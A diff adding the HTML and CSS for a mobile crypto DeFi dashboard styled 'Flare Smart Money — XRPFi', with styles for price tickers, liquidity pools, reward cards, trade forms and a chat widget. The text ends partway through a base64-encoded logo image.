@@ -1,0 +1,1284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Flare Smart Money — XRPFi</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+:root{
+  --fr:#E8234A;--fp:#F5A7B8;--fl:#FFF0F3;--fc:#FBF5F6;
+  --fd:#0D0D0D;--fg:#6B6B6B;--fb:#E8E8E8;--fbc:#f0dde3;
+  --xrp:#346AA9;--xrpdim:rgba(52,106,169,0.1);--xrplight:#EEF4FB;
+  --teal:#1d5566;
+  --green:#16a34a;--gdim:rgba(22,163,74,.1);
+  --rdim:rgba(232,35,74,.1);--adim:rgba(217,119,6,.1);--amber:#d97706;
+  --bdim:rgba(37,99,235,.08);--blue:#2563eb;
+  --pdim:rgba(124,58,237,.1);--purple:#7c3aed;
+}
+*{box-sizing:border-box;margin:0;padding:0;font-family:'DM Sans',sans-serif;}
+html,body{height:100%;background:#f0f2f5;display:flex;align-items:flex-start;justify-content:center;padding:0;}
+::-webkit-scrollbar{width:2px;}
+::-webkit-scrollbar-thumb{background:var(--fbc);}
+
+.app{
+  background:#fff;
+  width:100%;
+  max-width:430px;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  position:relative;
+  overflow:hidden;
+}
+
+/* TOP BAR */
+.tbar{display:flex;align-items:center;justify-content:space-between;padding:12px 16px 10px;border-bottom:1px solid var(--fb);background:rgba(255,255,255,0.97);backdrop-filter:blur(12px);flex-shrink:0;position:sticky;top:0;z-index:100;}
+.tlogo{display:flex;align-items:center;gap:8px;}
+.lmark{width:30px;height:30px;border-radius:9px;background:#fff;display:flex;align-items:center;justify-content:center;flex-shrink:0;overflow:hidden;border:1px solid var(--fbc);}
+.lmark::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.18),transparent);}
+.lf{font-weight:800;font-size:16px;color:#fff;z-index:1;position:relative;}
+.ln{font-size:13px;font-weight:600;color:var(--fd);display:block;line-height:1.1;}
+.ls{font-size:9px;color:var(--fr);font-weight:500;display:block;}
+.xrp-badge{display:flex;align-items:center;gap:5px;padding:4px 10px;background:var(--xrpdim);border-radius:20px;font-size:10px;color:var(--xrp);font-weight:600;border:1px solid rgba(52,106,169,.18);}
+.xdot{width:6px;height:6px;border-radius:50%;background:var(--xrp);animation:bk 2s infinite;}
+@keyframes bk{0%,100%{opacity:1}50%{opacity:.3}}
+
+/* NAV TABS */
+.ntabs{display:flex;border-bottom:1px solid var(--fb);background:#fff;flex-shrink:0;position:sticky;top:54px;z-index:99;overflow-x:auto;}
+.ntabs::-webkit-scrollbar{display:none;}
+.nt{flex:1;min-width:58px;padding:8px 3px 7px;font-size:9px;font-weight:500;color:var(--fg);border:none;background:transparent;cursor:pointer;display:flex;flex-direction:column;align-items:center;gap:2px;border-bottom:2px solid transparent;transition:all .15s;white-space:nowrap;}
+.nt .ic{font-size:15px;line-height:1;}
+.nt.on{color:var(--fr);border-bottom-color:var(--fr);}
+.nt:hover{color:var(--fr);}
+
+/* MAIN SCROLL */
+.main{flex:1;overflow-y:auto;background:var(--fl);padding-bottom:20px;}
+.pnl{display:none;padding:14px 14px 80px;}
+.pnl.on{display:block;}
+
+/* XRP STRIP */
+.xstrip{background:linear-gradient(135deg,#2a6b7c 0%,#1d5566 50%,#18454f 100%);border-radius:14px;padding:14px 15px;margin-bottom:13px;position:relative;overflow:hidden;}
+.xstrip::before{content:'';position:absolute;inset:0;background:radial-gradient(circle at 80% 30%,rgba(255,255,255,.06),transparent);}
+.xs-top{display:flex;align-items:center;justify-content:space-between;gap:8px;margin-bottom:11px;position:relative;}
+.xs-lbl{font-size:10px;color:rgba(255,255,255,.65);}
+.xs-val{font-size:22px;font-weight:700;color:#fff;letter-spacing:-.02em;}
+.xs-sub{font-size:10px;color:rgba(255,255,255,.5);}
+.xs-btn{background:var(--fr);color:#fff;padding:9px 15px;border-radius:9px;border:none;cursor:pointer;font-size:11px;font-weight:600;white-space:nowrap;flex-shrink:0;transition:opacity .2s;}
+.xs-btn:hover{opacity:.88;}
+.xs-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:rgba(255,255,255,.08);border-radius:10px;overflow:hidden;position:relative;}
+.xs-s{background:rgba(0,0,0,.15);padding:8px;text-align:center;}
+.xs-sv{font-size:13px;font-weight:700;color:#fff;}
+.xs-sl{font-size:9px;color:rgba(255,255,255,.5);margin-top:1px;}
+
+/* TICKER */
+.ticker{background:linear-gradient(135deg,var(--xrplight),#fff);border:1px solid rgba(52,106,169,.2);border-radius:13px;padding:12px 14px;margin-bottom:13px;display:flex;align-items:center;gap:12px;}
+.t-icon{width:38px;height:38px;border-radius:50%;background:linear-gradient(135deg,#346AA9,#1a4a7a);display:flex;align-items:center;justify-content:center;flex-shrink:0;color:#fff;font-size:12px;font-weight:700;}
+.t-price{font-size:22px;font-weight:700;color:var(--xrp);letter-spacing:-.02em;}
+.t-chg{font-size:11px;color:var(--green);font-weight:600;margin-top:1px;}
+.t-right{margin-left:auto;text-align:right;}
+.t-mcap{font-size:11px;font-weight:600;color:var(--fd);}
+.t-vol{font-size:10px;color:var(--fg);}
+
+/* METRICS */
+.mets{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-bottom:13px;}
+.mc{background:#fff;border:1px solid var(--fbc);border-radius:13px;padding:11px 13px;transition:border-color .2s;}
+.mc:hover{border-color:var(--fp);}
+.mc.acc{background:linear-gradient(135deg,#fff,var(--fl));border-color:rgba(232,35,74,.2);}
+.mc.xacc{background:linear-gradient(135deg,#fff,var(--xrplight));border-color:rgba(52,106,169,.2);}
+.ml{font-size:10px;color:var(--fg);font-weight:500;margin-bottom:4px;}
+.mv{font-size:19px;font-weight:600;color:var(--fd);letter-spacing:-.02em;}
+.mch{font-size:10px;margin-top:3px;font-weight:500;}
+.up{color:var(--green);}
+.dn{color:var(--fr);}
+
+/* CARDS */
+.card{background:#fff;border:1px solid var(--fbc);border-radius:14px;padding:13px 14px;margin-bottom:11px;}
+.card:last-child{margin-bottom:0;}
+.ch{font-size:10px;font-weight:600;color:var(--fg);text-transform:uppercase;letter-spacing:.05em;margin-bottom:10px;}
+.slbl{font-size:9px;font-weight:600;letter-spacing:.08em;text-transform:uppercase;color:var(--fg);margin-bottom:8px;padding-left:1px;}
+
+/* TAGS */
+.tag{display:inline-block;padding:2px 7px;border-radius:20px;font-size:9px;font-weight:600;border:1px solid;}
+.tg{background:var(--gdim);color:var(--green);border-color:rgba(22,163,74,.2);}
+.tr{background:var(--rdim);color:var(--fr);border-color:rgba(232,35,74,.2);}
+.tb{background:var(--bdim);color:var(--blue);border-color:rgba(37,99,235,.18);}
+.ta{background:var(--adim);color:var(--amber);border-color:rgba(217,119,6,.2);}
+.tp{background:var(--pdim);color:var(--purple);border-color:rgba(124,58,237,.2);}
+.tx{background:var(--xrpdim);color:var(--xrp);border-color:rgba(52,106,169,.2);}
+
+/* TOKEN ROWS */
+.tok{display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid var(--fb);}
+.tok:last-child{border-bottom:none;}
+.tic{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;flex-shrink:0;font-weight:700;}
+.xic{background:linear-gradient(135deg,#346AA9,#1a4a7a);color:#fff;}
+.tn{font-size:13px;font-weight:600;color:var(--fd);}
+.tsub{font-size:10px;color:var(--fg);}
+.trr{margin-left:auto;text-align:right;}
+.tp2{font-size:12px;font-weight:600;color:var(--fd);}
+
+/* POOL ROWS */
+.pool{display:flex;align-items:center;gap:9px;padding:8px 0;border-bottom:1px solid var(--fb);}
+.pool:last-child{border-bottom:none;}
+.pp{display:flex;}
+.pp span{width:20px;height:20px;border-radius:50%;font-size:9px;display:flex;align-items:center;justify-content:center;margin-right:-4px;border:2px solid #fff;font-weight:700;}
+.pi{margin-left:8px;flex:1;}
+.pn{font-size:13px;font-weight:600;color:var(--fd);}
+.ps{font-size:10px;color:var(--fg);}
+.apy{font-size:13px;font-weight:700;color:var(--green);margin-left:auto;}
+
+/* PROTO CARDS */
+.plbl{font-size:9px;font-weight:600;letter-spacing:.07em;text-transform:uppercase;color:#c47a8a;margin-bottom:6px;}
+.proto{background:var(--fc);border:1px solid var(--fbc);border-radius:12px;padding:11px 13px;display:flex;align-items:flex-start;gap:10px;margin-bottom:8px;cursor:pointer;transition:transform .18s,box-shadow .18s;text-decoration:none;}
+.proto:hover{transform:translateX(5px);box-shadow:-3px 0 0 var(--fr);}
+.proto.xhov:hover{box-shadow:-3px 0 0 var(--xrp);}
+.proto:last-child{margin-bottom:0;}
+.pic{width:30px;height:30px;border-radius:50%;border:1.5px solid var(--fr);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:13px;}
+.pic.xb{border-color:var(--xrp);}
+.ptit{font-size:12px;font-weight:600;color:var(--fr);margin-bottom:2px;}
+.ptit.xc{color:var(--xrp);}
+.pdesc{font-size:11px;color:var(--fg);line-height:1.4;}
+
+/* PROGRESS */
+.pb{height:4px;background:var(--fb);border-radius:4px;margin-top:5px;}
+.pf{height:4px;border-radius:4px;background:linear-gradient(90deg,var(--fr),var(--fp));}
+.pf.xbar{background:linear-gradient(90deg,var(--xrp),#5a9fd4);}
+
+/* ORB */
+.orb-w{display:flex;flex-direction:column;align-items:center;padding:10px 0 5px;}
+.orb{width:80px;height:80px;border-radius:50%;background:radial-gradient(circle at 35% 35%,#ffd0dc 0%,#f5a7b8 25%,#E8234A 55%,#8b1a30 85%,#3d0d18 100%);box-shadow:0 0 28px rgba(232,35,74,.3);animation:op 6s ease-in-out infinite;position:relative;}
+.orb::after{content:'';position:absolute;inset:0;border-radius:50%;background:radial-gradient(circle at 25% 25%,rgba(255,255,255,.35) 0%,transparent 55%);}
+@keyframes op{0%,100%{transform:scale(1);box-shadow:0 0 28px rgba(232,35,74,.3);}50%{transform:scale(1.05);box-shadow:0 0 45px rgba(232,35,74,.5);}}
+.ostat{text-align:center;margin-top:8px;}
+.on2{font-size:14px;font-weight:600;color:var(--fd);}
+.ol{font-size:10px;color:var(--fg);margin-top:2px;}
+
+/* PARTICIPATE GRID */
+.pgrid{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-bottom:13px;}
+.pcard{background:#fff;border:1px solid var(--fbc);border-radius:14px;padding:13px 11px;display:flex;flex-direction:column;align-items:center;text-align:center;gap:8px;cursor:pointer;transition:transform .2s,box-shadow .2s;}
+.pcard:hover{transform:translateY(-4px);box-shadow:0 12px 28px rgba(232,35,74,.1);}
+.pic2{width:44px;height:44px;border-radius:50%;background:var(--fl);display:flex;align-items:center;justify-content:center;font-size:20px;}
+.ptit2{font-size:11px;font-weight:600;color:var(--fr);}
+.pdesc2{font-size:10px;color:var(--fg);line-height:1.4;}
+
+/* FASSET */
+.fasset{background:linear-gradient(135deg,var(--xrplight),#fff);border:1px solid rgba(52,106,169,.18);border-radius:14px;padding:14px;margin-bottom:11px;}
+.fh{display:flex;align-items:center;gap:10px;margin-bottom:11px;}
+.fi-icon{width:34px;height:34px;border-radius:50%;background:linear-gradient(135deg,#346AA9,#1a4a7a);display:flex;align-items:center;justify-content:center;color:#fff;font-size:12px;font-weight:700;flex-shrink:0;}
+.fn{font-size:13px;font-weight:600;color:var(--xrp);}
+.fs{font-size:10px;color:var(--fg);}
+.fstats{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-bottom:11px;}
+.fst{background:rgba(52,106,169,.07);border-radius:9px;padding:7px 8px;text-align:center;}
+.fstv{font-size:12px;font-weight:700;color:var(--xrp);}
+.fstl{font-size:9px;color:var(--fg);margin-top:1px;}
+
+/* REWARD CARD */
+.rcard{background:linear-gradient(135deg,var(--fl),#fff);border:1px solid rgba(232,35,74,.18);border-radius:14px;padding:13px 14px;margin-bottom:11px;position:relative;overflow:hidden;}
+.rcard::before{content:'';position:absolute;width:100px;height:100px;border-radius:50%;background:var(--fr);filter:blur(40px);opacity:.06;top:-20px;right:-15px;}
+.rcard.xcard{background:linear-gradient(135deg,var(--xrplight),#fff);border-color:rgba(52,106,169,.2);}
+.rcard.xcard::before{background:var(--xrp);}
+.rtit{font-size:12px;font-weight:600;color:var(--fr);margin-bottom:3px;}
+.rtit.xc{color:var(--xrp);}
+.rsub{font-size:10px;color:var(--fg);margin-bottom:10px;}
+.rrow{display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;}
+.rk{font-size:11px;color:var(--fg);}
+.rv{font-size:11px;font-weight:600;color:var(--fd);}
+.rv.up{color:var(--green);}
+.rv.dn{color:var(--fr);}
+.rv.xv{color:var(--xrp);}
+.cbtn{width:100%;padding:10px;background:var(--fr);color:#fff;border:none;border-radius:10px;font-size:12px;font-weight:600;cursor:pointer;margin-top:10px;transition:opacity .2s;}
+.cbtn:hover{opacity:.88;}
+.cbtn.out{background:transparent;border:1.5px solid var(--fr);color:var(--fr);}
+.cbtn.xbtn{background:linear-gradient(135deg,#346AA9,#1a4a7a);}
+.cbtn.xout{background:transparent;border:1.5px solid var(--xrp);color:var(--xrp);}
+.btn-row{display:flex;gap:7px;margin-top:10px;}
+.btn-row .cbtn{margin-top:0;}
+
+/* FORMS */
+.fl2{font-size:10px;color:var(--fg);font-weight:500;margin-bottom:4px;}
+.fi2{width:100%;padding:9px 11px;background:#fff;border:1px solid var(--fb);border-radius:10px;font-size:12px;color:var(--fd);outline:none;transition:border-color .2s;}
+.fi2:focus{border-color:var(--fr);}
+.fsel{width:100%;padding:9px 11px;background:#fff;border:1px solid var(--fb);border-radius:10px;font-size:12px;color:var(--fd);outline:none;cursor:pointer;appearance:none;}
+.fg{display:grid;gap:8px;}
+.f2{grid-template-columns:1fr 1fr;}
+.pcrow{display:flex;gap:5px;margin:7px 0;}
+.pcbtn{flex:1;padding:5px;border:1px solid var(--fb);background:var(--fl);color:var(--fg);border-radius:7px;font-size:10px;cursor:pointer;text-align:center;transition:all .15s;}
+.pcbtn:hover{border-color:var(--fr);color:var(--fr);background:var(--rdim);}
+.stabs{display:flex;gap:6px;margin-bottom:11px;}
+.stab{flex:1;padding:8px;border-radius:9px;border:1px solid var(--fb);background:transparent;color:var(--fg);font-size:11px;font-weight:500;cursor:pointer;text-align:center;transition:all .15s;}
+.stab.bon{background:var(--gdim);border-color:rgba(22,163,74,.25);color:var(--green);}
+.stab.son{background:var(--rdim);border-color:rgba(232,35,74,.25);color:var(--fr);}
+.obtn{width:100%;padding:11px;border:none;border-radius:10px;font-size:13px;font-weight:600;cursor:pointer;margin-top:5px;transition:opacity .2s;}
+.buyb{background:linear-gradient(135deg,#16a34a,#22c55e);color:#fff;}
+.sellb{background:linear-gradient(135deg,#E8234A,#f06080);color:#fff;}
+.obtn:hover{opacity:.9;}
+
+/* TABLE */
+.tw{overflow-x:auto;}
+table{width:100%;border-collapse:collapse;font-size:11px;}
+th{text-align:left;padding:6px 8px;color:var(--fg);font-weight:600;letter-spacing:.04em;border-bottom:1px solid var(--fb);font-size:10px;text-transform:uppercase;}
+td{padding:8px 8px;color:var(--fd);border-bottom:1px solid var(--fb);}
+tr:last-child td{border-bottom:none;}
+tr:hover td{background:var(--fl);}
+.xb{padding:3px 9px;background:transparent;border:1px solid var(--fb);border-radius:6px;color:var(--fg);font-size:10px;cursor:pointer;transition:all .15s;}
+.xb:hover{border-color:var(--fr);color:var(--fr);background:var(--rdim);}
+
+/* FEAT ITEMS */
+.fi3{padding:10px 0;border-bottom:1px solid var(--fb);}
+.fi3:last-child{border-bottom:none;}
+.ftag{font-size:9px;font-weight:600;letter-spacing:.08em;text-transform:uppercase;color:var(--fr);margin-bottom:3px;}
+.ftit{font-size:12px;font-weight:500;color:var(--fd);margin-bottom:3px;}
+.fdesc{font-size:11px;color:var(--fg);line-height:1.5;}
+
+/* CHAT */
+.tgstrip{background:linear-gradient(90deg,rgba(0,136,204,.09),transparent);border:1px solid rgba(0,136,204,.18);border-radius:12px;padding:10px 13px;display:flex;align-items:center;gap:10px;margin-bottom:11px;}
+.tgic{width:28px;height:28px;border-radius:50%;background:#0088cc;display:flex;align-items:center;justify-content:center;font-size:14px;color:#fff;flex-shrink:0;}
+.tgt{font-size:11px;color:var(--fd);}
+.tgs{font-size:9px;color:var(--fg);}
+.tgbtn{margin-left:auto;padding:6px 12px;background:#0088cc;color:#fff;border:none;border-radius:8px;font-size:10px;font-weight:600;cursor:pointer;flex-shrink:0;}
+.chat-box{background:#fff;border:1px solid var(--fbc);border-radius:14px;overflow:hidden;}
+.chat-head{display:flex;align-items:center;gap:10px;padding:11px 13px;border-bottom:1px solid var(--fb);}
+.bav{width:28px;height:28px;border-radius:8px;background:var(--fr);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:13px;flex-shrink:0;}
+.chat-name{font-size:12px;font-weight:600;color:var(--fd);}
+.chat-sub{font-size:10px;color:var(--fg);}
+.online{display:flex;align-items:center;gap:4px;padding:3px 8px;background:var(--xrpdim);border-radius:20px;font-size:10px;color:var(--xrp);font-weight:600;margin-left:auto;}
+.online::before{content:'';width:5px;height:5px;border-radius:50%;background:var(--xrp);animation:bk 2s infinite;}
+.cmsgs{height:320px;overflow-y:auto;padding:12px 13px;display:flex;flex-direction:column;gap:9px;}
+.mb{display:flex;gap:7px;align-items:flex-start;}
+.mu{display:flex;justify-content:flex-end;}
+.bavs{width:22px;height:22px;border-radius:6px;background:var(--fr);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:10px;flex-shrink:0;margin-top:1px;}
+.bbub{background:var(--fc);border:1px solid var(--fbc);border-radius:3px 11px 11px 11px;padding:9px 12px;font-size:12px;color:var(--fd);line-height:1.55;max-width:90%;}
+.ubub{background:var(--fr);border-radius:11px 3px 11px 11px;padding:9px 12px;font-size:12px;color:#fff;line-height:1.55;max-width:80%;}
+.chips{display:flex;flex-wrap:wrap;gap:5px;margin-top:8px;}
+.chip{padding:4px 10px;background:#fff;border:1px solid var(--fbc);border-radius:20px;font-size:10px;color:var(--fg);cursor:pointer;transition:all .14s;}
+.chip:hover{border-color:var(--fr);color:var(--fr);background:var(--rdim);}
+.cinp{border-top:1px solid var(--fb);padding:11px 13px;display:flex;gap:7px;}
+.cinp input{flex:1;background:var(--fl);border:1px solid var(--fbc);border-radius:10px;padding:9px 12px;font-size:12px;color:var(--fd);outline:none;transition:border-color .2s;}
+.cinp input:focus{border-color:var(--fr);background:#fff;}
+.cinp input::placeholder{color:var(--fg);}
+.sbtn{width:36px;height:36px;border-radius:10px;background:var(--fr);border:none;color:#fff;cursor:pointer;font-size:14px;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:opacity .18s;}
+.sbtn:hover{opacity:.85;}
+.td{width:5px;height:5px;border-radius:50%;background:var(--fg);animation:tda .9s infinite;display:inline-block;}
+.td:nth-child(2){animation-delay:.15s;}.td:nth-child(3){animation-delay:.3s;}
+@keyframes tda{0%,60%,100%{transform:translateY(0)}30%{transform:translateY(-5px)}}
+
+/* FOOTER */
+
+</style>
+</head>
+<body>
+<div class="app">
+
+  <!-- TOP BAR -->
+  <div class="tbar">
+    <div class="tlogo">
+      <div class="lmark"><img src="data:image/png;base64,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